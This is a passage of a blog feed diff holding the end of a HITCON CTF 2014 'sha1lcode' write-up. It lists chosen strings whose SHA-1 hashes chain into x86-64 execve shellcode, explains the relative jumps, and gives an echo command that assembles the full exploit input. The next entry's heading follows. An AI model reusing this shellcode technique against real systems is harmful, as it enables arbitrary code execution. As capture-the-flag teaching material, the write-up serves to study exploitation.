+&lt;span class="s-Atom"&gt;ikLEsXBe58oJIuFL&lt;/span&gt; &lt;span class="s-Atom"&gt;:&lt;/span&gt; &lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="s-Atom"&gt;start&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt; &lt;span class="s-Atom"&gt;jmp&lt;/span&gt; &lt;span class="m"&gt;2&lt;/span&gt;
+&lt;span class="nv"&gt;CYOEsiM5zOvynLcZ&lt;/span&gt; &lt;span class="s-Atom"&gt;:&lt;/span&gt;   &lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="s-Atom"&gt;end&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt; &lt;span class="s-Atom"&gt;xor&lt;/span&gt; &lt;span class="s-Atom"&gt;eax&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="s-Atom"&gt;eax&lt;/span&gt;
+&lt;span class="nv"&gt;EI6Tlq7y76Vh5hyN&lt;/span&gt; &lt;span class="s-Atom"&gt;:&lt;/span&gt; &lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="s-Atom"&gt;start&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt; &lt;span class="s-Atom"&gt;jmp&lt;/span&gt; &lt;span class="m"&gt;2&lt;/span&gt;
+&lt;span class="nv"&gt;S61SFzdOBn3zyrBf&lt;/span&gt; &lt;span class="s-Atom"&gt;:&lt;/span&gt;   &lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="s-Atom"&gt;end&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt; &lt;span class="s-Atom"&gt;mov&lt;/span&gt; &lt;span class="s-Atom"&gt;bl&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="m"&gt;0&lt;/span&gt;&lt;span class="s-Atom"&gt;x97&lt;/span&gt;
+&lt;span class="nv"&gt;EI6Tlq7y76Vh5hyN&lt;/span&gt; &lt;span class="s-Atom"&gt;:&lt;/span&gt; &lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="s-Atom"&gt;start&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt; &lt;span class="s-Atom"&gt;jmp&lt;/span&gt; &lt;span class="m"&gt;2&lt;/span&gt;
+&lt;span class="s-Atom"&gt;zihgN1OfifVotOPs&lt;/span&gt; &lt;span class="s-Atom"&gt;:&lt;/span&gt;   &lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="s-Atom"&gt;end&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt; &lt;span class="s-Atom"&gt;mov&lt;/span&gt; &lt;span class="s-Atom"&gt;bh&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="m"&gt;0&lt;/span&gt;&lt;span class="s-Atom"&gt;xff&lt;/span&gt;
+&lt;span class="s-Atom"&gt;qzg3NxCyYGweMVIr&lt;/span&gt; &lt;span class="s-Atom"&gt;:&lt;/span&gt; &lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="s-Atom"&gt;start&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt; &lt;span class="s-Atom"&gt;jmp&lt;/span&gt; &lt;span class="m"&gt;3&lt;/span&gt;
+&lt;span class="s-Atom"&gt;czbdI1dngWv4nbYv&lt;/span&gt; &lt;span class="s-Atom"&gt;:&lt;/span&gt;   &lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="s-Atom"&gt;end&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt; &lt;span class="s-Atom"&gt;shl&lt;/span&gt; &lt;span class="nv"&gt;EBX&lt;/span&gt;
+&lt;span class="nv"&gt;EI6Tlq7y76Vh5hyN&lt;/span&gt; &lt;span class="s-Atom"&gt;:&lt;/span&gt; &lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="s-Atom"&gt;start&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt; &lt;span class="s-Atom"&gt;jmp&lt;/span&gt; &lt;span class="m"&gt;2&lt;/span&gt;
+&lt;span class="nv"&gt;UqZhIrIoQrZu29qM&lt;/span&gt; &lt;span class="s-Atom"&gt;:&lt;/span&gt;   &lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="s-Atom"&gt;end&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt; &lt;span class="s-Atom"&gt;mov&lt;/span&gt; &lt;span class="s-Atom"&gt;bh&lt;/span&gt;
+&lt;span class="nv"&gt;EI6Tlq7y76Vh5hyN&lt;/span&gt; &lt;span class="s-Atom"&gt;:&lt;/span&gt; &lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="s-Atom"&gt;start&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt; &lt;span class="s-Atom"&gt;jmp&lt;/span&gt; &lt;span class="m"&gt;2&lt;/span&gt;
+&lt;span class="s-Atom"&gt;gMq4RKcD34SOoMpk&lt;/span&gt; &lt;span class="s-Atom"&gt;:&lt;/span&gt;   &lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="s-Atom"&gt;end&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt; &lt;span class="s-Atom"&gt;mov&lt;/span&gt; &lt;span class="s-Atom"&gt;bl&lt;/span&gt;
+&lt;span class="s-Atom"&gt;qzg3NxCyYGweMVIr&lt;/span&gt; &lt;span class="s-Atom"&gt;:&lt;/span&gt; &lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="s-Atom"&gt;start&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt; &lt;span class="s-Atom"&gt;jmp&lt;/span&gt; &lt;span class="m"&gt;3&lt;/span&gt;
+&lt;span class="s-Atom"&gt;j90mqufCQHUY7DFI&lt;/span&gt; &lt;span class="s-Atom"&gt;:&lt;/span&gt;   &lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="s-Atom"&gt;end&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt; &lt;span class="s-Atom"&gt;part&lt;/span&gt; &lt;span class="s-Atom"&gt;shl&lt;/span&gt;
+&lt;span class="nv"&gt;BkrI3NqemVnl6iq2&lt;/span&gt; &lt;span class="s-Atom"&gt;:&lt;/span&gt; &lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="s-Atom"&gt;start&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt; &lt;span class="s-Atom"&gt;part&lt;/span&gt; &lt;span class="s-Atom"&gt;shl&lt;/span&gt; &lt;span class="s-Atom"&gt;and&lt;/span&gt; &lt;span class="s-Atom"&gt;jmp&lt;/span&gt; &lt;span class="m"&gt;2&lt;/span&gt;
+&lt;span class="s-Atom"&gt;l05Y1tnrwjQGa9GB&lt;/span&gt; &lt;span class="s-Atom"&gt;:&lt;/span&gt;   &lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="s-Atom"&gt;end&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt; &lt;span class="s-Atom"&gt;mov&lt;/span&gt; &lt;span class="s-Atom"&gt;ch&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="m"&gt;0&lt;/span&gt;&lt;span class="s-Atom"&gt;x91&lt;/span&gt;
+&lt;span class="nv"&gt;EI6Tlq7y76Vh5hyN&lt;/span&gt; &lt;span class="s-Atom"&gt;:&lt;/span&gt; &lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="s-Atom"&gt;start&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt; &lt;span class="s-Atom"&gt;jmp&lt;/span&gt; &lt;span class="m"&gt;2&lt;/span&gt;
+&lt;span class="s-Atom"&gt;mqKoGcLyK8fi3kSH&lt;/span&gt; &lt;span class="s-Atom"&gt;:&lt;/span&gt;   &lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="s-Atom"&gt;end&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt; &lt;span class="s-Atom"&gt;mov&lt;/span&gt; &lt;span class="s-Atom"&gt;cl&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="m"&gt;0&lt;/span&gt;&lt;span class="s-Atom"&gt;x96&lt;/span&gt;
+&lt;span class="s-Atom"&gt;qzg3NxCyYGweMVIr&lt;/span&gt; &lt;span class="s-Atom"&gt;:&lt;/span&gt; &lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="s-Atom"&gt;start&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt; &lt;span class="s-Atom"&gt;jmp&lt;/span&gt; &lt;span class="m"&gt;3&lt;/span&gt;
+&lt;span class="s-Atom"&gt;hVoED3xi4I5kTghS&lt;/span&gt; &lt;span class="s-Atom"&gt;:&lt;/span&gt;   &lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="s-Atom"&gt;end&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt; &lt;span class="s-Atom"&gt;shl&lt;/span&gt; &lt;span class="nv"&gt;ECX&lt;/span&gt;
+&lt;span class="nv"&gt;EI6Tlq7y76Vh5hyN&lt;/span&gt; &lt;span class="s-Atom"&gt;:&lt;/span&gt; &lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="s-Atom"&gt;start&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt; &lt;span class="s-Atom"&gt;jmp&lt;/span&gt; &lt;span class="m"&gt;2&lt;/span&gt;
+&lt;span class="m"&gt;70&lt;/span&gt;&lt;span class="s-Atom"&gt;hQz3yujDwrWyEi&lt;/span&gt; &lt;span class="s-Atom"&gt;:&lt;/span&gt;   &lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="s-Atom"&gt;end&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt; &lt;span class="s-Atom"&gt;mov&lt;/span&gt; &lt;span class="s-Atom"&gt;cl&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="m"&gt;0&lt;/span&gt;&lt;span class="s-Atom"&gt;xd1&lt;/span&gt;
+&lt;span class="nv"&gt;EI6Tlq7y76Vh5hyN&lt;/span&gt; &lt;span class="s-Atom"&gt;:&lt;/span&gt; &lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="s-Atom"&gt;start&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt; &lt;span class="s-Atom"&gt;jmp&lt;/span&gt; &lt;span class="m"&gt;2&lt;/span&gt;
+&lt;span class="nv"&gt;JcGdue7SlbVZ2lpg&lt;/span&gt; &lt;span class="s-Atom"&gt;:&lt;/span&gt;   &lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="s-Atom"&gt;end&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt; &lt;span class="s-Atom"&gt;mov&lt;/span&gt; &lt;span class="s-Atom"&gt;ch&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="m"&gt;0&lt;/span&gt;&lt;span class="s-Atom"&gt;x9d&lt;/span&gt;
+&lt;span class="s-Atom"&gt;qzg3NxCyYGweMVIr&lt;/span&gt; &lt;span class="s-Atom"&gt;:&lt;/span&gt; &lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="s-Atom"&gt;start&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt; &lt;span class="s-Atom"&gt;jmp&lt;/span&gt; &lt;span class="m"&gt;3&lt;/span&gt;
+&lt;span class="nv"&gt;XJodA3GFNyfC5mp1&lt;/span&gt; &lt;span class="s-Atom"&gt;:&lt;/span&gt;   &lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="s-Atom"&gt;end&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt; &lt;span class="s-Atom"&gt;or&lt;/span&gt; &lt;span class="s-Atom"&gt;rbx&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="s-Atom"&gt;rcx&lt;/span&gt;
+&lt;span class="s-Atom"&gt;qzg3NxCyYGweMVIr&lt;/span&gt; &lt;span class="s-Atom"&gt;:&lt;/span&gt; &lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="s-Atom"&gt;start&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt; &lt;span class="s-Atom"&gt;jmp&lt;/span&gt; &lt;span class="m"&gt;3&lt;/span&gt;
+&lt;span class="nv"&gt;CzoXGfRlsiDKfS4H&lt;/span&gt; &lt;span class="s-Atom"&gt;:&lt;/span&gt;   &lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="s-Atom"&gt;end&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt; &lt;span class="s-Atom"&gt;neg&lt;/span&gt; &lt;span class="s-Atom"&gt;rbx&lt;/span&gt;
+&lt;span class="s-Atom"&gt;qzg3NxCyYGweMVIr&lt;/span&gt; &lt;span class="s-Atom"&gt;:&lt;/span&gt; &lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="s-Atom"&gt;start&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt; &lt;span class="s-Atom"&gt;jmp&lt;/span&gt; &lt;span class="m"&gt;3&lt;/span&gt;
+&lt;span class="s-Atom"&gt;fgnxUdbfK3yemOIH&lt;/span&gt; &lt;span class="s-Atom"&gt;:&lt;/span&gt;   &lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="s-Atom"&gt;end&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt; &lt;span class="s-Atom"&gt;push&lt;/span&gt; &lt;span class="s-Atom"&gt;rbx&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="s-Atom"&gt;push&lt;/span&gt; &lt;span class="s-Atom"&gt;rsp&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="s-Atom"&gt;pop&lt;/span&gt; &lt;span class="s-Atom"&gt;rdi&lt;/span&gt;
+&lt;span class="s-Atom"&gt;qzg3NxCyYGweMVIr&lt;/span&gt; &lt;span class="s-Atom"&gt;:&lt;/span&gt; &lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="s-Atom"&gt;start&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt; &lt;span class="s-Atom"&gt;jmp&lt;/span&gt; &lt;span class="m"&gt;3&lt;/span&gt;
+&lt;span class="s-Atom"&gt;taglR8DRWWJmg8Ss&lt;/span&gt; &lt;span class="s-Atom"&gt;:&lt;/span&gt;   &lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="s-Atom"&gt;end&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt; &lt;span class="s-Atom"&gt;cdq&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="s-Atom"&gt;push&lt;/span&gt; &lt;span class="s-Atom"&gt;rdx&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="s-Atom"&gt;push&lt;/span&gt; &lt;span class="s-Atom"&gt;rdi&lt;/span&gt;
+&lt;span class="nv"&gt;EI6Tlq7y76Vh5hyN&lt;/span&gt; &lt;span class="s-Atom"&gt;:&lt;/span&gt; &lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="s-Atom"&gt;start&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt; &lt;span class="s-Atom"&gt;jmp&lt;/span&gt; &lt;span class="m"&gt;2&lt;/span&gt;
+&lt;span class="s-Atom"&gt;ygX8lQIoZ4Ln5EjX&lt;/span&gt; &lt;span class="s-Atom"&gt;:&lt;/span&gt;   &lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="s-Atom"&gt;end&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt; &lt;span class="s-Atom"&gt;push&lt;/span&gt; &lt;span class="s-Atom"&gt;rsp&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="s-Atom"&gt;pop&lt;/span&gt; &lt;span class="s-Atom"&gt;rsi&lt;/span&gt;
+&lt;span class="nv"&gt;EI6Tlq7y76Vh5hyN&lt;/span&gt; &lt;span class="s-Atom"&gt;:&lt;/span&gt; &lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="s-Atom"&gt;start&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt; &lt;span class="s-Atom"&gt;jmp&lt;/span&gt; &lt;span class="m"&gt;2&lt;/span&gt;
+&lt;span class="m"&gt;9&lt;/span&gt;&lt;span class="s-Atom"&gt;tyObcwpkagTLtEh&lt;/span&gt; &lt;span class="s-Atom"&gt;:&lt;/span&gt;   &lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="s-Atom"&gt;end&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt; &lt;span class="s-Atom"&gt;mov&lt;/span&gt; &lt;span class="s-Atom"&gt;al&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="m"&gt;0&lt;/span&gt;&lt;span class="s-Atom"&gt;x3b&lt;/span&gt;
+&lt;span class="nv"&gt;EI6Tlq7y76Vh5hyN&lt;/span&gt; &lt;span class="s-Atom"&gt;:&lt;/span&gt; &lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="s-Atom"&gt;start&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt; &lt;span class="s-Atom"&gt;jmp&lt;/span&gt; &lt;span class="m"&gt;2&lt;/span&gt;
+&lt;span class="nv"&gt;JtZj2STVLXTitmQD&lt;/span&gt; &lt;span class="s-Atom"&gt;:&lt;/span&gt;   &lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="s-Atom"&gt;end&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt; &lt;span class="s-Atom"&gt;syscall&lt;/span&gt;
+&lt;/pre&gt;&lt;/div&gt;
+
+
+&lt;p&gt;The number behind &lt;code&gt;jmp 2/3&lt;/code&gt; means if it will jump to 2 or 3 bytes before the end of the next hash. Because jumps are done relatively and not absolute it is always the same hash. &lt;code&gt;qzg3NxCyYGweMVIr == jump to the last 3 bytes of the next hash&lt;/code&gt; and &lt;code&gt;EI6Tlq7y76Vh5hyN == jump to the last 2 bytes of the next hash&lt;/code&gt;.&lt;/p&gt;
+&lt;p&gt;Now we can put the full string together, with &lt;code&gt;\x3a\x00\x00\x00&lt;/code&gt; as prefix to pass the first check, followed by the 16 byte chunks for the sha1 hashes:&lt;/p&gt;
+&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span class="n"&gt;echo&lt;/span&gt; &lt;span class="s"&gt;&amp;quot;&lt;/span&gt;&lt;span class="se"&gt;\x3a\x00\x00\x00&lt;/span&gt;&lt;span class="s"&gt;ikLEsXBe58oJIuFLCYOEsiM5zOvynLcZEI6Tlq7y76Vh5hyNS61SFzdOBn3zyrBfEI6Tlq7y76Vh5hyNzihgN1OfifVotOPsqzg3NxCyYGweMVIrczbdI1dngWv4nbYvEI6Tlq7y76Vh5hyNUqZhIrIoQrZu29qMEI6Tlq7y76Vh5hyNgMq4RKcD34SOoMpkqzg3NxCyYGweMVIrj90mqufCQHUY7DFIBkrI3NqemVnl6iq2l05Y1tnrwjQGa9GBEI6Tlq7y76Vh5hyNmqKoGcLyK8fi3kSHqzg3NxCyYGweMVIrhVoED3xi4I5kTghSEI6Tlq7y76Vh5hyN70hQz3yujDwrWyEiEI6Tlq7y76Vh5hyNJcGdue7SlbVZ2lpgqzg3NxCyYGweMVIrXJodA3GFNyfC5mp1qzg3NxCyYGweMVIrCzoXGfRlsiDKfS4Hqzg3NxCyYGweMVIrfgnxUdbfK3yemOIHqzg3NxCyYGweMVIrtaglR8DRWWJmg8SsEI6Tlq7y76Vh5hyNygX8lQIoZ4Ln5EjXEI6Tlq7y76Vh5hyN9tyObcwpkagTLtEhEI6Tlq7y76Vh5hyNJtZj2STVLXTitmQD`python -c &amp;#39;print &lt;/span&gt;&lt;span class="se"&gt;\&amp;quot;&lt;/span&gt;&lt;span class="s"&gt;A&lt;/span&gt;&lt;span class="se"&gt;\&amp;quot;&lt;/span&gt;&lt;span class="s"&gt;*0x3e8&amp;#39;`&amp;quot;&lt;/span&gt; &lt;span class="o"&gt;&amp;gt;&lt;/span&gt; &lt;span class="n"&gt;asd&lt;/span&gt;
+&lt;/pre&gt;&lt;/div&gt;</summary><category term="sha1lcode"></category><category term="hitconctf2014"></category></entry><entry><title>Be a Robot</title><link href="http://krebsco.de/be-a-robot.html" rel="alternate"></link><updated>2014-07-30T00:00:00+02:00</updated><author><name>makefu</name></author><id>tag:krebsco.de,2014-07-30:be-a-robot.html</id><summary type="html">&lt;ul&gt;
 &lt;li&gt;&lt;strong&gt;Solved by&lt;/strong&gt;: makefu&lt;/li&gt;
 &lt;/ul&gt;
 &lt;h2&gt;Intro&lt;/h2&gt;
